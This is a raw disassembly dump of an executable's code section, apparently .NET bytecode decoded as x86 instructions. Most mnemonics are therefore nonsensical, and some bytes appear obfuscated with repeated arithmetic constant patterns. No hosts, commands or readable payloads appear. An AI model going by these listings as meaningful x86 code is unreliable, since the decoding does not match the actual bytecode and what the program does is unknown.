  402b92:	0a 6f 46             	or     0x46(%edi),%ch
  402b95:	00 00                	add    %al,(%eax)
  402b97:	0a 26                	or     (%esi),%ah
  402b99:	11 0c 1f             	adc    %ecx,(%edi,%ebx,1)
  402b9c:	64 6f                	outsl  %fs:(%esi),(%dx)
  402b9e:	1e                   	push   %ds
  402b9f:	00 00                	add    %al,(%eax)
  402ba1:	0a 1f                	or     (%edi),%bl
  402ba3:	32 2f                	xor    (%edi),%ch
  402ba5:	0a 11                	or     (%ecx),%dl
  402ba7:	08 11                	or     %dl,(%ecx)
  402ba9:	0b 6f 47             	or     0x47(%edi),%ebp
  402bac:	00 00                	add    %al,(%eax)
  402bae:	0a 26                	or     (%esi),%ah
  402bb0:	11 05 17 58 13 05    	adc    %eax,0x5135817
  402bb6:	11 05 08 6f 41 00    	adc    %eax,0x416f08
  402bbc:	00 0a                	add    %cl,(%edx)
  402bbe:	32 c9                	xor    %cl,%cl
  402bc0:	09 20                	or     %esp,(%eax)
  402bc2:	15 0c 0a 98 28       	adc    $0x28980a0c,%eax
  402bc7:	19 00                	sbb    %eax,(%eax)
  402bc9:	00 06                	add    %al,(%esi)
  402bcb:	6f                   	outsl  %ds:(%esi),(%dx)
  402bcc:	48                   	dec    %eax
  402bcd:	00 00                	add    %al,(%eax)
  402bcf:	0a 26                	or     (%esi),%ah
  402bd1:	09 20                	or     %esp,(%eax)
  402bd3:	05 0c 0a 98 28       	add    $0x28980a0c,%eax
  402bd8:	19 00                	sbb    %eax,(%eax)
  402bda:	00 06                	add    %al,(%esi)
  402bdc:	11 08                	adc    %ecx,(%eax)
  402bde:	6f                   	outsl  %ds:(%esi),(%dx)
  402bdf:	27                   	daa
  402be0:	00 00                	add    %al,(%eax)
  402be2:	0a 20                	or     (%eax),%ah
  402be4:	9a 03 0a 98 28 19 00 	lcall  $0x19,$0x28980a03
  402beb:	00 06                	add    %al,(%esi)
  402bed:	28 22                	sub    %ah,(%edx)
  402bef:	00 00                	add    %al,(%eax)
  402bf1:	0a 6f 48             	or     0x48(%edi),%ch
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	0a 26                	or     (%esi),%ah
  402bf8:	09 20                	or     %esp,(%eax)
  402bfa:	76 0c                	jbe    0x402c08
  402bfc:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  402c02:	06                   	push   %es
  402c03:	11 0f                	adc    %ecx,(%edi)
  402c05:	20 9a 03 0a 98 28    	and    %bl,0x28980a03(%edx)
  402c0b:	19 00                	sbb    %eax,(%eax)
  402c0d:	00 06                	add    %al,(%esi)
  402c0f:	28 22                	sub    %ah,(%edx)
  402c11:	00 00                	add    %al,(%eax)
  402c13:	0a 6f 48             	or     0x48(%edi),%ch
  402c16:	00 00                	add    %al,(%eax)
  402c18:	0a 26                	or     (%esi),%ah
  402c1a:	09 1b                	or     %ebx,(%ebx)
  402c1c:	8d 4e 00             	lea    0x0(%esi),%ecx
  402c1f:	00 01                	add    %al,(%ecx)
  402c21:	25 16 20 5b 0c       	and    $0xc5b2016,%eax
  402c26:	0a 98 28 19 00 00    	or     0x1928(%eax),%bl
  402c2c:	06                   	push   %es
  402c2d:	a2 25 17 11 0b       	mov    %al,0xb111725
  402c32:	a2 25 18 20 4e       	mov    %al,0x4e201825
  402c37:	0c 0a                	or     $0xa,%al
  402c39:	98                   	cwtl
  402c3a:	28 19                	sub    %bl,(%ecx)
  402c3c:	00 00                	add    %al,(%eax)
  402c3e:	06                   	push   %es
  402c3f:	a2 25 19 11 0a       	mov    %al,0xa111925
  402c44:	a2 25 1a 20 a7       	mov    %al,0xa7201a25
  402c49:	0d 0a 98 28 19       	or     $0x1928980a,%eax
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	06                   	push   %es
  402c51:	a2 28 25 00 00       	mov    %al,0x2528
  402c56:	0a 6f 48             	or     0x48(%edi),%ch
  402c59:	00 00                	add    %al,(%eax)
  402c5b:	0a 26                	or     (%esi),%ah
  402c5d:	09 6f 27             	or     %ebp,0x27(%edi)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	0a 2a                	or     (%edx),%ch
  402c64:	1b 30                	sbb    (%eax),%esi
  402c66:	03 00                	add    (%eax),%eax
  402c68:	57                   	push   %edi
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 07                	add    %al,(%edi)
  402c6d:	00 00                	add    %al,(%eax)
  402c6f:	11 73 1d             	adc    %esi,0x1d(%ebx)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	0a 0a                	or     (%edx),%cl
  402c76:	02 73 49             	add    0x49(%ebx),%dh
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	0a 0b                	or     (%ebx),%cl
  402c7d:	16                   	push   %ss
  402c7e:	0c 2b                	or     $0x2b,%al
  402c80:	27                   	daa
  402c81:	06                   	push   %es
  402c82:	7e 07                	jle    0x402c8b
  402c84:	00 00                	add    %al,(%eax)
  402c86:	04 6f                	add    $0x6f,%al
  402c88:	41                   	inc    %ecx
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	0a 6f 1e             	or     0x1e(%edi),%ch
  402c8e:	00 00                	add    %al,(%eax)
  402c90:	0a 0d 07 7e 07 00    	or     0x77e07,%cl
  402c96:	00 04 09             	add    %al,(%ecx,%ecx,1)
  402c99:	6f                   	outsl  %ds:(%esi),(%dx)
  402c9a:	45                   	inc    %ebp
  402c9b:	00 00                	add    %al,(%eax)
  402c9d:	0a 6f 46             	or     0x46(%edi),%ch
  402ca0:	00 00                	add    %al,(%eax)
  402ca2:	0a 26                	or     (%esi),%ah
  402ca4:	08 17                	or     %dl,(%edi)
  402ca6:	58                   	pop    %eax
  402ca7:	0c 08                	or     $0x8,%al
  402ca9:	02 32                	add    (%edx),%dh
  402cab:	d5 07                	aad    $0x7
  402cad:	6f                   	outsl  %ds:(%esi),(%dx)
  402cae:	27                   	daa
  402caf:	00 00                	add    %al,(%eax)
  402cb1:	0a 13                	or     (%ebx),%dl
  402cb3:	04 de                	add    $0xde,%al
  402cb5:	0e                   	push   %cs
  402cb6:	26 de 00             	fiadds %es:(%eax)
  402cb9:	20 91 0d 0a 98 28    	and    %dl,0x28980a0d(%ecx)
  402cbf:	19 00                	sbb    %eax,(%eax)
  402cc1:	00 06                	add    %al,(%esi)
  402cc3:	2a 11                	sub    (%ecx),%dl
  402cc5:	04 2a                	add    $0x2a,%al
  402cc7:	00 01                	add    %al,(%ecx)
  402cc9:	10 00                	adc    %al,(%eax)
  402ccb:	00 00                	add    %al,(%eax)
  402ccd:	00 00                	add    %al,(%eax)
  402ccf:	00 46 46             	add    %al,0x46(%esi)
  402cd2:	00 03                	add    %al,(%ebx)
  402cd4:	34 00                	xor    $0x0,%al
  402cd6:	00 01                	add    %al,(%ecx)
  402cd8:	13 30                	adc    (%eax),%esi
  402cda:	03 00                	add    (%eax),%eax
  402cdc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402cdd:	00 00                	add    %al,(%eax)
  402cdf:	00 08                	add    %cl,(%eax)
  402ce1:	00 00                	add    %al,(%eax)
  402ce3:	11 73 15             	adc    %esi,0x15(%ebx)
  402ce6:	00 00                	add    %al,(%eax)
  402ce8:	06                   	push   %es
  402ce9:	0a 73 4a             	or     0x4a(%ebx),%dh
  402cec:	00 00                	add    %al,(%eax)
  402cee:	0a 0b                	or     (%ebx),%cl
  402cf0:	06                   	push   %es
  402cf1:	7e 26                	jle    0x402d19
  402cf3:	00 00                	add    %al,(%eax)
  402cf5:	0a 7d 08             	or     0x8(%ebp),%bh
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	04 07                	add    $0x7,%al
  402cfc:	6f                   	outsl  %ds:(%esi),(%dx)
  402cfd:	4b                   	dec    %ebx
  402cfe:	00 00                	add    %al,(%eax)
  402d00:	0a 02                	or     (%edx),%al
  402d02:	6f                   	outsl  %ds:(%esi),(%dx)
  402d03:	4c                   	dec    %esp
  402d04:	00 00                	add    %al,(%eax)
  402d06:	0a 07                	or     (%edi),%al
  402d08:	6f                   	outsl  %ds:(%esi),(%dx)
  402d09:	4b                   	dec    %ebx
  402d0a:	00 00                	add    %al,(%eax)
  402d0c:	0a 03                	or     (%ebx),%al
  402d0e:	6f                   	outsl  %ds:(%esi),(%dx)
  402d0f:	4d                   	dec    %ebp
  402d10:	00 00                	add    %al,(%eax)
  402d12:	0a 04 28             	or     (%eax,%ebp,1),%al
  402d15:	28 00                	sub    %al,(%eax)
  402d17:	00 0a                	add    %cl,(%edx)
  402d19:	2d 0c 07 6f 4b       	sub    $0x4b6f070c,%eax
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	0a 04 6f             	or     (%edi,%ebp,2),%al
  402d23:	4e                   	dec    %esi
  402d24:	00 00                	add    %al,(%eax)
  402d26:	0a 07                	or     (%edi),%al
  402d28:	6f                   	outsl  %ds:(%esi),(%dx)
  402d29:	4b                   	dec    %ebx
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	0a 16                	or     (%esi),%dl
  402d2e:	6f                   	outsl  %ds:(%esi),(%dx)
  402d2f:	4f                   	dec    %edi
  402d30:	00 00                	add    %al,(%eax)
  402d32:	0a 07                	or     (%edi),%al
  402d34:	6f                   	outsl  %ds:(%esi),(%dx)
  402d35:	4b                   	dec    %ebx
  402d36:	00 00                	add    %al,(%eax)
  402d38:	0a 17                	or     (%edi),%dl
  402d3a:	6f                   	outsl  %ds:(%esi),(%dx)
  402d3b:	50                   	push   %eax
  402d3c:	00 00                	add    %al,(%eax)
  402d3e:	0a 07                	or     (%edi),%al
  402d40:	6f                   	outsl  %ds:(%esi),(%dx)
  402d41:	4b                   	dec    %ebx
  402d42:	00 00                	add    %al,(%eax)
  402d44:	0a 17                	or     (%edi),%dl
  402d46:	6f                   	outsl  %ds:(%esi),(%dx)
  402d47:	51                   	push   %ecx
  402d48:	00 00                	add    %al,(%eax)
  402d4a:	0a 07                	or     (%edi),%al
  402d4c:	6f                   	outsl  %ds:(%esi),(%dx)
  402d4d:	4b                   	dec    %ebx
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	0a 17                	or     (%edi),%dl
  402d52:	6f                   	outsl  %ds:(%esi),(%dx)
  402d53:	52                   	push   %edx
  402d54:	00 00                	add    %al,(%eax)
  402d56:	0a 07                	or     (%edi),%al
  402d58:	06                   	push   %es
  402d59:	fe 06                	incb   (%esi)
  402d5b:	16                   	push   %ss
  402d5c:	00 00                	add    %al,(%eax)
  402d5e:	06                   	push   %es
  402d5f:	73 53                	jae    0x402db4
  402d61:	00 00                	add    %al,(%eax)
  402d63:	0a 6f 54             	or     0x54(%edi),%ch
  402d66:	00 00                	add    %al,(%eax)
  402d68:	0a 07                	or     (%edi),%al
  402d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  402d6b:	55                   	push   %ebp
  402d6c:	00 00                	add    %al,(%eax)
  402d6e:	0a 26                	or     (%esi),%ah
  402d70:	07                   	pop    %es
  402d71:	6f                   	outsl  %ds:(%esi),(%dx)
  402d72:	56                   	push   %esi
  402d73:	00 00                	add    %al,(%eax)
  402d75:	0a 05 15 31 08 07    	or     0x7083115,%al
  402d7b:	05 6f 57 00 00       	add    $0x576f,%eax
  402d80:	0a 26                	or     (%esi),%ah
  402d82:	06                   	push   %es
  402d83:	7b 08                	jnp    0x402d8d
  402d85:	00 00                	add    %al,(%eax)
  402d87:	04 2a                	add    $0x2a,%al
  402d89:	00 00                	add    %al,(%eax)
  402d8b:	00 1b                	add    %bl,(%ebx)
  402d8d:	30 01                	xor    %al,(%ecx)
  402d8f:	00 2a                	add    %ch,(%edx)
  402d91:	00 00                	add    %al,(%eax)
  402d93:	00 09                	add    %cl,(%ecx)
  402d95:	00 00                	add    %al,(%eax)
  402d97:	11 02                	adc    %eax,(%edx)
  402d99:	28 58 00             	sub    %bl,0x0(%eax)
  402d9c:	00 0a                	add    %cl,(%edx)
  402d9e:	0a 06                	or     (%esi),%al
  402da0:	28 59 00             	sub    %bl,0x0(%ecx)
  402da3:	00 0a                	add    %cl,(%edx)
  402da5:	2d 06 06 28 14       	sub    $0x14280606,%eax
  402daa:	00 00                	add    %al,(%eax)
  402dac:	06                   	push   %es
  402dad:	02 28                	add    (%eax),%ch
  402daf:	59                   	pop    %ecx
  402db0:	00 00                	add    %al,(%eax)
  402db2:	0a 2d 0c 02 28 5a    	or     0x5a28020c,%ch
  402db8:	00 00                	add    %al,(%eax)
  402dba:	0a 26                	or     (%esi),%ah
  402dbc:	de 03                	fiadds (%ebx)
  402dbe:	26 de 00             	fiadds %es:(%eax)
  402dc1:	2a 00                	sub    (%eax),%al
  402dc3:	00 01                	add    %al,(%ecx)
  402dc5:	10 00                	adc    %al,(%eax)
  402dc7:	00 00                	add    %al,(%eax)
  402dc9:	00 1d 00 09 26 00    	add    %bl,0x260900
  402dcf:	03 34 00             	add    (%eax,%eax,1),%esi
  402dd2:	00 01                	add    %al,(%ecx)
  402dd4:	1e                   	push   %ds
  402dd5:	02 28                	add    (%eax),%ch
  402dd7:	14 00                	adc    $0x0,%al
  402dd9:	00 0a                	add    %cl,(%edx)
  402ddb:	2a 13                	sub    (%ebx),%dl
  402ddd:	30 04 00             	xor    %al,(%eax,%eax,1)
  402de0:	41                   	inc    %ecx
  402de1:	00 00                	add    %al,(%eax)
  402de3:	00 09                	add    %cl,(%ecx)
  402de5:	00 00                	add    %al,(%eax)
  402de7:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402dea:	5b                   	pop    %ebx
  402deb:	00 00                	add    %al,(%eax)
  402ded:	0a 0a                	or     (%edx),%cl
  402def:	06                   	push   %es
  402df0:	2c 14                	sub    $0x14,%al
  402df2:	06                   	push   %es
  402df3:	6f                   	outsl  %ds:(%esi),(%dx)
  402df4:	5c                   	pop    %esp
  402df5:	00 00                	add    %al,(%eax)
  402df7:	0a 25 0a 7e 26 00    	or     0x267e0a,%ah
  402dfd:	00 0a                	add    %cl,(%edx)
  402dff:	28 29                	sub    %ch,(%ecx)
  402e01:	00 00                	add    %al,(%eax)
  402e03:	0a 2b                	or     (%ebx),%ch
  402e05:	01 16                	add    %edx,(%esi)
  402e07:	39 1c 00             	cmp    %ebx,(%eax,%eax,1)
  402e0a:	00 00                	add    %al,(%eax)
  402e0c:	02 02                	add    (%edx),%al
  402e0e:	7b 08                	jnp    0x402e18
  402e10:	00 00                	add    %al,(%eax)
  402e12:	04 06                	add    $0x6,%al
  402e14:	20 bd 04 0a 98 28    	and    %bh,0x28980a04(%ebp)
  402e1a:	19 00                	sbb    %eax,(%eax)
  402e1c:	00 06                	add    %al,(%esi)
  402e1e:	28 22                	sub    %ah,(%edx)
  402e20:	00 00                	add    %al,(%eax)
  402e22:	0a 7d 08             	or     0x8(%ebp),%bh
  402e25:	00 00                	add    %al,(%eax)
  402e27:	04 2a                	add    $0x2a,%al
  402e29:	00 00                	add    %al,(%eax)
  402e2b:	00 13                	add    %dl,(%ebx)
  402e2d:	30 03                	xor    %al,(%ebx)
  402e2f:	00 6f 01             	add    %ch,0x1(%edi)
  402e32:	00 00                	add    %al,(%eax)
  402e34:	0a 00                	or     (%eax),%al
  402e36:	00 11                	add    %dl,(%ecx)
  402e38:	20 e1                	and    %ah,%cl
  402e3a:	55                   	push   %ebp
  402e3b:	cf                   	iret
  402e3c:	70 0c                	jo     0x402e4a
  402e3e:	20 61 66             	and    %ah,0x66(%ecx)
  402e41:	b1 18                	mov    $0x18,%cl
  402e43:	08 58 0d             	or     %bl,0xd(%eax)
  402e46:	73 5d                	jae    0x402ea5
  402e48:	00 00                	add    %al,(%eax)
  402e4a:	0a 80 0c 00 00 04    	or     0x400000c(%eax),%al
  402e50:	18 0b                	sbb    %cl,(%ebx)
  402e52:	07                   	pop    %es
  402e53:	16                   	push   %ss
  402e54:	73 5e                	jae    0x402eb4
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 13                	or     (%ebx),%dl
  402e5a:	05 07 18 59 0b       	add    $0xb591807,%eax
  402e5f:	11 05 07 6f 5f 00    	adc    %eax,0x5f6f07
  402e65:	00 0a                	add    %cl,(%edx)
  402e67:	13 04 07             	adc    (%edi,%eax,1),%eax
  402e6a:	13 06                	adc    (%esi),%eax
  402e6c:	11 04 2d 15 73 60 00 	adc    %eax,0x607315(,%ebp,1)
  402e73:	00 0a                	add    %cl,(%edx)
  402e75:	13 05 17 13 06 11    	adc    0x11061317,%eax
  402e7b:	05 11 06 6f 5f       	add    $0x5f6f0611,%eax
  402e80:	00 00                	add    %al,(%eax)
  402e82:	0a 13                	or     (%ebx),%dl
  402e84:	04 20                	add    $0x20,%al
  402e86:	29 b4 59 a6 08 61 09 	sub    %esi,0x96108a6(%ecx,%ebx,2)
  402e8d:	61                   	popa
  402e8e:	66 65 66 65 66 65 66 	data16 gs data16 gs data16 gs data16 data16 (bad)
  402e95:	66 65 20 bc 3b 94 d4 
  402e9c:	08 
  402e9d:	59                   	pop    %ecx
  402e9e:	09 58 66             	or     %ebx,0x66(%eax)
  402ea1:	66 65 65 66 66 65 66 	data16 gs gs data16 data16 gs gs popaw
  402ea8:	65 61 
  402eaa:	0a 11                	or     (%ecx),%dl
  402eac:	04 2d                	add    $0x2d,%al
  402eae:	03 14 2b             	add    (%ebx,%ebp,1),%edx
  402eb1:	07                   	pop    %es
  402eb2:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402eb5:	61                   	popa
  402eb6:	00 00                	add    %al,(%eax)
  402eb8:	0a 13                	or     (%ebx),%dl
  402eba:	08 11                	or     %dl,(%ecx)
  402ebc:	04 2c                	add    $0x2c,%al
  402ebe:	15 06 08 20 de       	adc    $0xde200806,%eax
  402ec3:	ed                   	in     (%dx),%eax
  402ec4:	f5                   	cmc
  402ec5:	f3 58                	repz pop %eax
  402ec7:	09 61 66             	or     %esp,0x66(%ecx)
  402eca:	65 66 65 66 65 66 66 	gs data16 gs data16 gs data16 gs popaw
  402ed1:	65 61 
  402ed3:	0a 11                	or     (%ecx),%dl
  402ed5:	08 2d 03 14 2b 07    	or     %ch,0x72b1403
  402edb:	11 08                	adc    %ecx,(%eax)
  402edd:	6f                   	outsl  %ds:(%esi),(%dx)
  402ede:	62 00                	bound  %eax,(%eax)
  402ee0:	00 0a                	add    %cl,(%edx)
  402ee2:	13 07                	adc    (%edi),%eax
  402ee4:	11 07                	adc    %eax,(%edi)
  402ee6:	d0 4c 00 00          	rorb   $1,0x0(%eax,%eax,1)
  402eea:	01 28                	add    %ebp,(%eax)
  402eec:	63 00                	arpl   %eax,(%eax)
  402eee:	00 0a                	add    %cl,(%edx)
  402ef0:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  402ef4:	0a 2c 1f             	or     (%edi,%ebx,1),%ch
  402ef7:	7e 11                	jle    0x402f0a
  402ef9:	00 00                	add    %al,(%eax)
  402efb:	04 1a                	add    $0x1a,%al
  402efd:	60                   	pusha
  402efe:	80 11 00             	adcb   $0x0,(%ecx)
  402f01:	00 04 06             	add    %al,(%esi,%eax,1)
  402f04:	08 20                	or     %ah,(%eax)
  402f06:	88 ea                	mov    %ch,%dl
  402f08:	4f                   	dec    %edi
  402f09:	f9                   	stc
  402f0a:	61                   	popa
  402f0b:	09 59 07             	or     %ebx,0x7(%ecx)
  402f0e:	58                   	pop    %eax
  402f0f:	61                   	popa
  402f10:	0a 38                	or     (%eax),%bh
  402f12:	84 00                	test   %al,(%eax)
  402f14:	00 00                	add    %al,(%eax)
  402f16:	11 07                	adc    %eax,(%edi)
  402f18:	14 28                	adc    $0x28,%al
  402f1a:	64 00 00             	add    %al,%fs:(%eax)
  402f1d:	0a 2c 56             	or     (%esi,%edx,2),%ch
  402f20:	11 05 11 06 28 1d    	adc    %eax,0x1d280611
  402f26:	00 00                	add    %al,(%eax)
  402f28:	06                   	push   %es
  402f29:	2c 28                	sub    $0x28,%al
  402f2b:	06                   	push   %es
  402f2c:	20 3f                	and    %bh,(%edi)
  402f2e:	74 4e                	je     0x402f7e
  402f30:	e7 08                	out    %eax,$0x8
  402f32:	59                   	pop    %ecx
  402f33:	09 61 66             	or     %esp,0x66(%ecx)
  402f36:	65 66 66 65 65 66 66 	gs data16 data16 gs gs data16 data16 gs gs popw %es
  402f3d:	65 66 65 07 
  402f41:	59                   	pop    %ecx
  402f42:	61                   	popa
  402f43:	0a 1f                	or     (%edi),%bl
  402f45:	10 7e 11             	adc    %bh,0x11(%esi)
  402f48:	00 00                	add    %al,(%eax)
  402f4a:	04 60                	add    $0x60,%al
  402f4c:	80 11 00             	adcb   $0x0,(%ecx)
  402f4f:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  402f52:	47                   	inc    %edi
  402f53:	06                   	push   %es
  402f54:	20 24 5d af 05 08 58 	and    %ah,0x580805af(,%ebx,2)
  402f5b:	09 58 66             	or     %ebx,0x66(%eax)
  402f5e:	65 66 65 66 65 66 66 	gs data16 gs data16 gs data16 gs popaw
  402f65:	65 61 
  402f67:	0a 17                	or     (%edi),%dl
  402f69:	7e 11                	jle    0x402f7c
  402f6b:	00 00                	add    %al,(%eax)
  402f6d:	04 60                	add    $0x60,%al
  402f6f:	80 11 00             	adcb   $0x0,(%ecx)
  402f72:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  402f75:	24 06                	and    $0x6,%al
  402f77:	20 40 74             	and    %al,0x74(%eax)
  402f7a:	4e                   	dec    %esi
  402f7b:	e7 08                	out    %eax,$0x8
  402f7d:	59                   	pop    %ecx
  402f7e:	09 61 66             	or     %esp,0x66(%ecx)
  402f81:	66 65 66 65 65 66 66 	data16 gs data16 gs gs data16 gs popw %es
  402f88:	65 07 
  402f8a:	59                   	pop    %ecx
  402f8b:	61                   	popa
  402f8c:	0a 1f                	or     (%edi),%bl
  402f8e:	10 7e 11             	adc    %bh,0x11(%esi)
  402f91:	00 00                	add    %al,(%eax)
  402f93:	04 60                	add    $0x60,%al
  402f95:	80 11 00             	adcb   $0x0,(%ecx)
  402f98:	00 04 7e             	add    %al,(%esi,%edi,2)
  402f9b:	0d 00 00 04 06       	or     $0x6040000,%eax
  402fa0:	58                   	pop    %eax
  402fa1:	80 0d 00 00 04 2a 00 	orb    $0x0,0x2a040000
  402fa8:	13 30                	adc    (%eax),%esi
  402faa:	03 00                	add    (%eax),%eax
  402fac:	19 00                	sbb    %eax,(%eax)
  402fae:	00 00                	add    %al,(%eax)
  402fb0:	09 00                	or     %eax,(%eax)
  402fb2:	00 11                	add    %dl,(%ecx)
  402fb4:	7e 0c                	jle    0x402fc2
  402fb6:	00 00                	add    %al,(%eax)
  402fb8:	04 02                	add    $0x2,%al
  402fba:	12 00                	adc    (%eax),%al
  402fbc:	6f                   	outsl  %ds:(%esi),(%dx)
  402fbd:	65 00 00             	add    %al,%gs:(%eax)
  402fc0:	0a 2c 02             	or     (%edx,%eax,1),%ch
  402fc3:	06                   	push   %es
  402fc4:	2a 02                	sub    (%edx),%al
  402fc6:	17                   	pop    %ss
  402fc7:	28 1a                	sub    %bl,(%edx)
  402fc9:	00 00                	add    %al,(%eax)
  402fcb:	06                   	push   %es
  402fcc:	2a 00                	sub    (%eax),%al
  402fce:	00 00                	add    %al,(%eax)
  402fd0:	1b 30                	sbb    (%eax),%esi
  402fd2:	05 00 4f 08 00       	add    $0x84f00,%eax
  402fd7:	00 0b                	add    %cl,(%ebx)
  402fd9:	00 00                	add    %al,(%eax)
  402fdb:	11 20                	adc    %esp,(%eax)
  402fdd:	49                   	dec    %ecx
  402fde:	8e 87 c7 0a 20 b1    	mov    -0x4edff539(%edi),%es
  402fe4:	60                   	pusha
  402fe5:	e1 c1                	loope  0x402fa8
  402fe7:	06                   	push   %es
  402fe8:	61                   	popa
  402fe9:	0b 14 13             	or     (%ebx,%edx,1),%edx
  402fec:	04 2b                	add    $0x2b,%al
  402fee:	12 7e 0c             	adc    0xc(%esi),%bh
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	04 02                	add    $0x2,%al
  402ff5:	12 04 6f             	adc    (%edi,%ebp,2),%al
  402ff8:	65 00 00             	add    %al,%gs:(%eax)
  402ffb:	0a 2c 03             	or     (%ebx,%eax,1),%ch
  402ffe:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  403001:	7e 0c                	jle    0x40300f
  403003:	00 00                	add    %al,(%eax)
  403005:	04 13                	add    $0x13,%al
  403007:	2a 16                	sub    (%esi),%dl
  403009:	13 3a                	adc    (%edx),%edi
  40300b:	11 2a                	adc    %ebp,(%edx)
  40300d:	12 3a                	adc    (%edx),%bh
  40300f:	28 66 00             	sub    %ah,0x0(%esi)
  403012:	00 0a                	add    %cl,(%edx)
  403014:	7e 0e                	jle    0x403024
  403016:	00 00                	add    %al,(%eax)
  403018:	04 3a                	add    $0x3a,%al
  40301a:	b9 03 00 00 28       	mov    $0x28000003,%ecx
  40301f:	67 00 00             	add    %al,(%bx,%si)
  403022:	0a 13                	or     (%ebx),%dl
  403024:	27                   	daa
  403025:	28 68 00             	sub    %ch,0x0(%eax)
  403028:	00 0a                	add    %cl,(%edx)
  40302a:	13 25 7e 0a 00 00    	adc    0xa7e,%esp
  403030:	04 06                	add    $0x6,%al
  403032:	20 41 15             	and    %al,0x15(%ecx)
  403035:	2a 32                	sub    (%edx),%dh
  403037:	58                   	pop    %eax
  403038:	07                   	pop    %es
  403039:	58                   	pop    %eax
  40303a:	60                   	pusha
  40303b:	80 0a 00             	orb    $0x0,(%edx)
  40303e:	00 04 11             	add    %al,(%ecx,%edx,1)
  403041:	27                   	daa
  403042:	73 44                	jae    0x403088
  403044:	00 00                	add    %al,(%eax)
  403046:	0a 13                	or     (%ebx),%dl
  403048:	06                   	push   %es
  403049:	20 b4 80 e9 e1 06 61 	and    %dh,0x6106e1e9(%eax,%eax,4)
  403050:	07                   	pop    %es
  403051:	59                   	pop    %ecx
  403052:	0d 11 06 09 d1       	or     $0xd1090611,%eax
  403057:	28 46 00             	sub    %al,0x0(%esi)
  40305a:	00 0a                	add    %cl,(%edx)
  40305c:	09 1f                	or     %ebx,(%edi)
  40305e:	10 63 d1             	adc    %ah,-0x2f(%ebx)
  403061:	28 46 00             	sub    %al,0x0(%esi)
  403064:	00 0a                	add    %cl,(%edx)
  403066:	26 20 42 5d          	and    %al,%es:0x5d(%edx)
  40306a:	e9 ed 06 59 07       	jmp    0x799375c
  40306f:	61                   	popa
  403070:	0d 11 06 09 d1       	or     $0xd1090611,%eax
  403075:	28 46 00             	sub    %al,0x0(%esi)
  403078:	00 0a                	add    %cl,(%edx)
  40307a:	09 1f                	or     %ebx,(%edi)
  40307c:	10 63 d1             	adc    %ah,-0x2f(%ebx)
  40307f:	28 46 00             	sub    %al,0x0(%esi)
  403082:	00 0a                	add    %cl,(%edx)
  403084:	26 06                	es push %es
  403086:	20 c7                	and    %al,%bh
  403088:	a2 17 52 58 07       	mov    %al,0x7585217
  40308d:	58                   	pop    %eax
  40308e:	0d 11 06 09 d1       	or     $0xd1090611,%eax
  403093:	28 46 00             	sub    %al,0x0(%esi)
  403096:	00 0a                	add    %cl,(%edx)
  403098:	09 1f                	or     %ebx,(%edi)
  40309a:	10 63 d1             	adc    %ah,-0x2f(%ebx)
  40309d:	28 46 00             	sub    %al,0x0(%esi)
  4030a0:	00 0a                	add    %cl,(%edx)
  4030a2:	26 20 b8 40 e2 e1 06 	and    %bh,%es:0x6e1e240(%eax)
  4030a9:	61                   	popa
  4030aa:	07                   	pop    %es
  4030ab:	61                   	popa
  4030ac:	0d 11 06 09 d1       	or     $0xd1090611,%eax
  4030b1:	28 46 00             	sub    %al,0x0(%esi)
  4030b4:	00 0a                	add    %cl,(%edx)
  4030b6:	09 1f                	or     %ebx,(%edi)
  4030b8:	10 63 d1             	adc    %ah,-0x2f(%ebx)
  4030bb:	28 46 00             	sub    %al,0x0(%esi)
  4030be:	00 0a                	add    %cl,(%edx)
  4030c0:	26 20 bf a2 11 32 06 	and    %bh,%es:0x63211a2(%edi)
  4030c7:	58                   	pop    %eax
  4030c8:	07                   	pop    %es
  4030c9:	58                   	pop    %eax
  4030ca:	0d 11 06 09 d1       	or     $0xd1090611,%eax
  4030cf:	28 46 00             	sub    %al,0x0(%esi)
  4030d2:	00 0a                	add    %cl,(%edx)
  4030d4:	26 11 06             	adc    %eax,%es:(%esi)
  4030d7:	28 69 00             	sub    %ch,0x0(%ecx)
  4030da:	00 0a                	add    %cl,(%edx)
  4030dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4030dd:	6a 00                	push   $0x0
  4030df:	00 0a                	add    %cl,(%edx)
  4030e1:	13 3c 18             	adc    (%eax,%ebx,1),%edi
  4030e4:	13 08                	adc    (%eax),%ecx
  4030e6:	11 08                	adc    %ecx,(%eax)
  4030e8:	16                   	push   %ss
  4030e9:	73 5e                	jae    0x403149
  4030eb:	00 00                	add    %al,(%eax)
  4030ed:	0a 13                	or     (%ebx),%dl
  4030ef:	12 7e 0a             	adc    0xa(%esi),%bh
  4030f2:	00 00                	add    %al,(%eax)
  4030f4:	04 20                	add    $0x20,%al
  4030f6:	87 96 ee cd 06 59    	xchg   %edx,0x5906cdee(%esi)
  4030fc:	07                   	pop    %es
  4030fd:	59                   	pop    %ecx
  4030fe:	11 08                	adc    %ecx,(%eax)
  403100:	60                   	pusha
  403101:	61                   	popa
  403102:	80 0a 00             	orb    $0x0,(%edx)
  403105:	00 04 11             	add    %al,(%ecx,%edx,1)
  403108:	08 18                	or     %bl,(%eax)
  40310a:	59                   	pop    %ecx
  40310b:	13 08                	adc    (%eax),%ecx
  40310d:	11 12                	adc    %edx,(%edx)
  40310f:	11 08                	adc    %ecx,(%eax)
  403111:	6f                   	outsl  %ds:(%esi),(%dx)
  403112:	5f                   	pop    %edi
  403113:	00 00                	add    %al,(%eax)
